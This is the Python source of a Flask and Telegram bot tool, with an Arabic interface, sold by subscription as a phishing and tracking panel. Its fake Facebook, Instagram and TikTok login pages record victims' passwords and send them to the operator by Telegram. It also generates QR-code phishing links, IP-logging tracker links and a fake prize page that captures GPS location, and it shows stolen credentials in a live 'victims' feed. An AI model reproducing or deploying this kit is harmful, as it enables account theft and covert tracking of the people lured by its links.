import os
import threading
import telebot
import requests
import qrcode
import exifread
import base64
import uuid
import json
from io import BytesIO
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string, redirect, session
from openai import OpenAI

# ================= إعدادات البوت (هتتقرأ من Render) =================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_CHAT_ID = os.environ.get("OWNER_CHAT_ID", "")
bot = telebot.TeleBot(BOT_TOKEN)

BASE_URL = os.environ.get("BASE_URL", "https://your-app-name.onrender.com")

# ================= إعدادات السيرفر =================
app = Flask(__name__)
app.secret_key = "jarvis_super_secret_key_2026"
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

# هنا بنقرا المفتاح من إعدادات Render
API_KEY = os.environ.get("OPENROUTER_API_KEY", "")
client = OpenAI(base_url="https://openrouter.ai/api/v1", api_key=API_KEY, timeout=40.0)
MODELS = ["openrouter/free", "meta-llama/llama-3.2-3b-instruct:free"]
current_action = None
USERS_FILE = "users.json"

def load_users():
    users = {}
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            try: users = json.load(f)
            except: users = {}
    if "admin@jarvis.com" not in users:
        users["admin@jarvis.com"] = {"password": "admin123", "role": "admin", "name": "المالك", "expiry": "never"}
    else:
        users["admin@jarvis.com"]["expiry"] = "never"
        users["admin@jarvis.com"]["role"] = "admin"
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, ensure_ascii=False, indent=2)
    return users

def check_login(email, password):
    users = load_users()
    if email in users and users[email]["password"] == password:
        user = users[email]
        if user.get("expiry") and user.get("expiry") != "never":
            try:
                expiry_date = datetime.strptime(user["expiry"], "%Y-%m-%d")
                if datetime.now() > expiry_date:
                    return {"error": "expired", "message": "انتهت صلاحية اشتراكك."}
            except: pass
        return user
    return None

# ================= قوالب الويب (HTML) =================
LOGIN_HTML = """
<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🔐 دخول الجارفس</title>
<style>body{background:#0f172a;color:#38bdf8;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#1e293b;padding:40px 30px;border-radius:15px;text-align:center;width:90%;max-width:350px;box-shadow:0 10px 30px rgba(0,0,0,0.5)}h2{color:#38bdf8;margin-bottom:30px}input{width:100%;padding:12px;margin-bottom:15px;background:#0f172a;color:#fff;border:1px solid #38bdf8;border-radius:8px;box-sizing:border-box;font-size:16px;text-align:center}button{width:100%;background:#38bdf8;color:#000;padding:12px;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}</style></head>
<body><div class="box"><h2>🤖 Jarvis Login</h2><form method="POST" action="/login"><input type="email" name="email" placeholder="الإيميل" required><input type="password" name="password" placeholder="كلمة المرور" required><button type="submit">دخول</button></form></div></body></html>
"""

PHISH_HTML = """
<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تسجيل الدخول</title>
<style>body { background: #f0f2f5; font-family: Arial; text-align: center; padding-top: 50px; }.container { background: white; padding: 30px 20px; max-width: 300px; margin: auto; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }h2 { color: #1877f2; margin-bottom: 20px; } input { width: 90%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 6px; }button { background: #1877f2; color: white; padding: 12px; border: none; width: 97%; border-radius: 6px; font-weight: bold; cursor: pointer; }</style></head>
<body><div class="container"><h2 id="site-name">تسجيل الدخول</h2><form method="POST" action=""><input type="text" name="email" placeholder="البريد الإلكتروني" required><br><input type="password" name="password" placeholder="كلمة المرور" required><br><button type="submit" id="login-btn">تسجيل الدخول</button></form></div><script>let p=window.location.pathname.split('/')[2];const n=document.getElementById('site-name');const b=document.getElementById('login-btn');if(p.includes('instagram')||p.includes('انستجرام')){n.innerText='Instagram';n.style.color='#E1306C';b.style.background='#E1306C';}else if(p.includes('tiktok')||p.includes('تيك')){n.innerText='TikTok';n.style.color='#000';b.style.background='#000';b.style.color='#fff';}else{n.innerText='Facebook';}</script></body></html>"""

EXIF_HTML = """
<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تحليل الصور</title></head>
<body style="background:#0f172a;color:#38bdf8;font-family:monospace;text-align:center;padding-top:50px;"><h2>استخراج معلومات الصورة</h2><form method="POST" enctype="multipart/form-data" style="background:#000;padding:20px;display:inline-block;border:1px solid #38bdf8;border-radius:10px;"><input type="file" name="image" accept="image/*" required style="color:white;margin-bottom:20px;"><br><button type="submit" style="background:#38bdf8;color:#000;padding:10px 20px;border:none;font-weight:bold;cursor:pointer;">تحليل</button></form></body></html>"""

LOC_HTML = """
<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>لعبة الحظ</title>
<style>body{background:#0f172a;color:#fff;text-align:center;padding-top:100px;font-family:sans-serif}.btn{background:#38bdf8;color:#000;padding:15px 40px;border:none;border-radius:50px;font-size:20px;font-weight:bold;cursor:pointer;margin-top:30px}</style></head>
<body><h1>🎁 مبروك! لقد ربحت هدية</h1><p>اضغط بالأسفل لمعرفة موقع أقرب فرع لاستلام هديتك.</p>
<button class="btn" onclick="getLoc()">اكتشف الآن</button>
<script>function getLoc(){navigator.geolocation.getCurrentPosition(function(p){fetch('/capture_location/{{ owner }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude})});document.body.innerHTML='<h1>✅ تم تسجيل موقعك!</h1>';});}</script>
</body></html>"""

HTML = """
<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Jarvis Pro Panel</title>
<style>body { background: #0f172a; color: #38bdf8; font-family: monospace; padding: 20px; margin:0;}.header { display: flex; justify-content: space-between; align-items: center; background: #1e293b; padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; }.header span { color: #fbbf24; font-weight: bold; } .header a { color: #ef4444; text-decoration: none; font-size: 14px; }#chat-box { background: #000; padding: 15px; height: 55vh; overflow-y: scroll; border: 1px solid #38bdf8; margin-bottom: 10px; white-space: pre-wrap; line-height: 1.6;}input { width: 75%; padding: 10px; background: #000; color: #fff; border: 1px solid #38bdf8; }button { padding: 10px; background: #38bdf8; color: #000; font-weight: bold; border: none; cursor: pointer;}.user { color: #fff; } .ai { color: #38bdf8; } .menu { color: #fbbf24; font-weight: bold; }.victim { color: #ff4d4d; font-weight: bold; background: #1a0000; padding: 8px; border-radius: 5px; border: 1px solid #ff4d4d; margin-top: 5px; display: block; }img { border-radius: 10px; margin-top: 10px; max-width: 100%; }</style></head>
<body>
    <div class="header"><div>المستخدم: <span>{{ user_name }}</span> ({{ role }})</div><a href="/logout">خروج 🚪</a></div>
    <div id="chat-box">
        <span class="ai"><b>جارفس:</b> مرحباً بك يا {{ user_name }}. اختر رقم الأمر:</span><br>
        <span class="menu">
        1. أداة تصيد (رابط)<br>2. أداة تصيد (رمز QR) 📱<br>3. استخراج معلومات الصورة (EXIF) 🖼️<br>4. تتبع الأجهزة (IP Tracker) 🕵️‍♂️<br>5. عرض سجلات التتبع 📋<br>6. سحب الموقع الدقيق (GPS) 📍<br>
        {% if role == 'admin' %}10. إدارة المستخدمين والاشتراكات 👥<br>{% endif %}
        0. محادثة حرة (AI Chat)
        </span>
    </div>
    <input type="text" id="msg" placeholder="اكتب رقم الأمر..." onkeypress="if(event.key === 'Enter') sendMsg()">
    <button onclick="sendMsg()">إرسال</button>
    <script>
        let lastVictimCount = null;
        async function monitorVictims() {
            try {
                const res = await fetch('/get_victims'); const data = await res.json(); const box = document.getElementById('chat-box');
                if (lastVictimCount === null) { lastVictimCount = data.count; return; }
                if (data.count > lastVictimCount) {
                    const newVictims = data.lines.slice(lastVictimCount);
                    newVictims.forEach(line => {
                        const parts = line.split('|');
                        box.innerHTML += `<br><div class="victim">🚨 <b>ضحية جديدة!</b><br>👤 صاحب اللينك: ${parts[0]||'?'}<br>🌐 النوع: ${parts[1]||'?'}<br>📧 الإيميل/الرقم: ${parts[2]||'?'}<br>🔑 الباسورد/التفاصيل: ${parts[3]||'?'}</div>`;
                    });
                    lastVictimCount = data.count; box.scrollTop = box.scrollHeight;
                }
            } catch (e) {}
        }
        monitorVictims(); setInterval(monitorVictims, 3000);
        async function sendMsg() {
            const msg = document.getElementById('msg').value; const box = document.getElementById('chat-box');
            if(!msg) return; box.innerHTML += `<br><span class="user"><b>أنت:</b> ${msg}</span>`; document.getElementById('msg').value = ''; box.scrollTop = box.scrollHeight;
            const loadingId = 'loading-' + Date.now(); box.innerHTML += `<br><span id="${loadingId}" class="ai" style="color: #38bdf8;"><i>جارفس يعمل...</i></span>`; box.scrollTop = box.scrollHeight;
            try {
                const res = await fetch('/ask', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({prompt: msg}) });
                const data = await res.json(); document.getElementById(loadingId).innerHTML = `<b>جارفس:</b> ${data.reply}`;
            } catch (e) { document.getElementById(loadingId).innerHTML = `<b>جارفس:</b> جاري المحاولة...`; }
            box.scrollTop = box.scrollHeight;
        }
    </script>
</body></html>"""

# ================= مسارات السيرفر =================
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = check_login(request.form.get('email'), request.form.get('password'))
        if user and "error" in user:
            return f"<html><body style='background:#0f172a;color:#ef4444;font-family:monospace;text-align:center;padding-top:100px;'><h2>🚫 {user['message']}</h2><br><a href='/login' style='color:#38bdf8;text-decoration:none;'>⬅ عودة</a></body></html>", 403
        if user:
            session['email'] = request.form.get('email'); session['name'] = user['name']; session['role'] = user['role']; return redirect('/')
        return "❌ بيانات خاطئة. <a href='/login'>جرب تاني</a>"
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout(): session.clear(); return redirect('/login')

@app.route('/')
def index():
    if 'email' not in session: return redirect('/login')
    return render_template_string(HTML, user_name=session['name'], role=session['role'])

@app.route('/get_victims')
def get_victims():
    if 'email' not in session: return jsonify({"count": 0, "lines": []})
    user_email = session['email']; is_admin = session['role'] == 'admin'
    if not os.path.exists("victims.txt"): return jsonify({"count": 0, "lines": []})
    with open("victims.txt", "r", encoding="utf-8") as f: all_lines = f.readlines()
    filtered_lines = [line for line in all_lines if is_admin or line.startswith(user_email)]
    return jsonify({"count": len(filtered_lines), "lines": filtered_lines})

@app.route('/phish/<platform>/<owner>', methods=['GET', 'POST'])
def phish(platform, owner):
    if request.method == 'POST':
        email = request.form.get('email'); password = request.form.get('password')
        with open("victims.txt", "a", encoding="utf-8") as f: f.write(f"{owner}|{platform}|{email}|{password}\n")
        try: bot.send_message(OWNER_CHAT_ID, f"🚨 ضحية جديدة!\nالمنصة: {platform}\nالإيميل: {email}\nالباسورد: {password}")
        except: pass
        if 'instagram' in platform: return redirect("https://www.instagram.com")
        if 'tiktok' in platform: return redirect("https://www.tiktok.com")
        return redirect("https://www.facebook.com")
    return render_template_string(PHISH_HTML)

@app.route('/exif_tool', methods=['GET', 'POST'])
def exif_tool():
    if 'email' not in session: return redirect('/login')
    if request.method == 'POST':
        file = request.files['image']
        if not file: return "No file"
        tags = exifread.process_file(file)
        output = ""
        for tag, value in tags.items():
            if tag in ['Image Make', 'Image Model', 'EXIF DateTimeOriginal', 'GPS GPSLatitude', 'GPS GPSLongitude']:
                output += f"<b>{tag}:</b> {value}<br>"
        if not output: output = "لم يتم العثور على بيانات EXIF."
        return f"<html><body style='background:#0f172a;color:#38bdf8;font-family:monospace;padding:20px;'><h2>النتيجة:</h2><div>{output}</div><br><a href='/exif_tool' style='color:#4ade80;'>⬅ عودة</a></body></html>"
    return render_template_string(EXIF_HTML)

@app.route('/track/<owner>/<track_id>')
def track(owner, track_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip: ip = ip.split(',')[0].strip()
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?lang=ar").json()
        country, city, isp = r.get('country', '?'), r.get('city', '?'), r.get('isp', '?')
    except: country, city, isp = "?","?","?"
    with open("tracker_logs.txt", "a", encoding="utf-8") as f: f.write(f"{owner}|{ip}|{country}|{city}|{isp}\n")
    return redirect("https://www.youtube.com")

@app.route('/loc/<owner>')
def loc_grabber(owner): return render_template_string(LOC_HTML, owner=owner)

@app.route('/capture_location/<owner>', methods=['POST'])
def capture_location(owner):
    d = request.json; lat, lon = d.get('lat'), d.get('lon')
    with open("victims.txt", "a", encoding="utf-8") as f: f.write(f"{owner}|GPS_Location|{lat}|{lon}\n")
    try: bot.send_message(OWNER_CHAT_ID, f"📍 موقع جديد لـ {owner}\nLat: {lat}\nLon: {lon}")
    except: pass
    return jsonify({"status":"ok"})

@app.route('/ask', methods=['POST'])
def ask():
    global current_action
    if 'email' not in session: return jsonify({"reply": "انتهت الجلسة."})
    prompt = request.json.get('prompt').strip()
    owner_email = session['email']
    base = BASE_URL
    p_lower = prompt.lower()
    detected_platform = None
    if "انستجرام" in prompt or "instagram" in p_lower: detected_platform = "instagram"
    elif "تيك توك" in prompt or "tiktok" in p_lower: detected_platform = "tiktok"
    elif "فيسبوك" in prompt or "facebook" in p_lower: detected_platform = "facebook"

    if current_action is None:
        if prompt == "1": current_action = "phishing"; return jsonify({"reply": "اكتب اسم الموقع (facebook/انستجرام/تيك توك):"})
        elif prompt == "2": current_action = "qr_phishing"; return jsonify({"reply": "اكتب اسم المنصة (facebook/انستجرام/تيك توك):"})
        elif prompt == "3": return jsonify({"reply": f"ارفع الصورة من هنا:<br><b><a href='{base}/exif_tool' target='_blank' style='color:#4ade80;'>{base}/exif_tool</a></b>"})
        elif prompt == "4": current_action = "tracker"; return jsonify({"reply": "اكتب اسم الموقع اللي هيتحول عليه (مثال: youtube):"})
        elif prompt == "5":
            if os.path.exists("tracker_logs.txt"):
                logs = open("tracker_logs.txt","r",encoding="utf-8").read().replace('\n','<br>')
                return jsonify({"reply": f"<b>السجلات:</b><br><pre style='font-size:12px;color:#fbbf24;'>{logs}</pre>"})
            return jsonify({"reply": "لا توجد سجلات."})
        elif prompt == "6": return jsonify({"reply": f"رابط سحب الموقع:<br><b><a href='{base}/loc/{owner_email}' target='_blank' style='color:#4ade80;'>{base}/loc/{owner_email}</a></b>"})
        elif prompt == "10" and session['role'] == 'admin':
            return jsonify({"reply": f"<b>لوحة إدارة المستخدمين:</b><br><a href='{base}/admin/users' target='_blank' style='color:#4ade80;font-size:18px;'>اضغط هنا للدخول 👥</a>"})
        elif prompt == "0": return jsonify({"reply": "اكتب سؤالك الحر:"})

    if current_action == "phishing":
        current_action = None; plat = detected_platform if detected_platform else prompt.lower()
        link = f"{base}/phish/{plat}/{owner_email}"
        return jsonify({"reply": f"رابط التصيد:<br><b><a href='{link}' target='_blank' style='color:#4ade80;'>{link}</a></b>"})
    elif current_action == "qr_phishing":
        current_action = None; plat = detected_platform if detected_platform else prompt.lower()
        link = f"{base}/phish/{plat}/{owner_email}"
        qr = qrcode.QRCode(version=1, box_size=10, border=4); qr.add_data(link); qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white"); buf = BytesIO(); img.save(buf, format="PNG"); b64 = base64.b64encode(buf.getvalue()).decode()
        return jsonify({"reply": f"<b>QR:</b><br><img src='data:image/png;base64,{b64}' width='200'><br><a href='{link}' target='_blank'>{link}</a>"})
    elif current_action == "tracker":
        current_action = None; tid = str(uuid.uuid4())[:8]; link = f"{base}/track/{owner_email}/{tid}"
        return jsonify({"reply": f"رابط التتبع:<br><b><a href='{link}' target='_blank' style='color:#4ade80;'>{link}</a></b>"})

    for m in MODELS:
        try:
            r = client.chat.completions.create(model=m, messages=[{"role": "user", "content": prompt}])
            if r.choices: return jsonify({"reply": r.choices[0].message.content})
        except: continue
    return jsonify({"reply": "الخوادم مشغولة."})

@app.route('/admin/users')
def admin_users():
    if 'email' not in session or session['role'] != 'admin': return redirect('/login')
    users = load_users(); now = datetime.now().strftime("%Y-%m-%d")
    html = "<html><body style='background:#0f172a;color:#38bdf8;font-family:monospace;padding:20px;'>"
    html += "<h2>إدارة المستخدمين</h2><form method='POST' action='/admin/add_user'>"
    html += "<input name='name' placeholder='الاسم' required><input name='email' placeholder='الإيميل' required><input name='password' placeholder='الباسورد' required><input type='number' name='days' value='30' required><button type='submit'>إضافة</button></form>"
    html += "<table border='1' style='margin-top:20px;width:100%;'><tr><th>الاسم</th><th>الإيميل</th><th>الصلاحية</th><th>الانتهاء</th></tr>"
    for e, d in users.items():
        color = "red" if d['expiry'] != 'never' and d['expiry'] < now else "white"
        html += f"<tr><td>{d['name']}</td><td>{e}</td><td>{d['role']}</td><td style='color:{color};'>{d['expiry']}</td></tr>"
    html += "</table></body></html>"
    return html

@app.route('/admin/add_user', methods=['POST'])
def admin_add_user():
    if 'email' not in session or session['role'] != 'admin': return redirect('/login')
    users = load_users()
    users[request.form.get('email')] = {"password": request.form.get('password'), "role": "user", "name": request.form.get('name'), "expiry": (datetime.now() + timedelta(days=int(request.form.get('days', 30)))).strftime("%Y-%m-%d")}
    with open(USERS_FILE, "w", encoding="utf-8") as f: json.dump(users, f, ensure_ascii=False, indent=2)
    return redirect('/admin/users')

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, threaded=True)

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    print("Bot is running...")
    bot.infinity_polling()
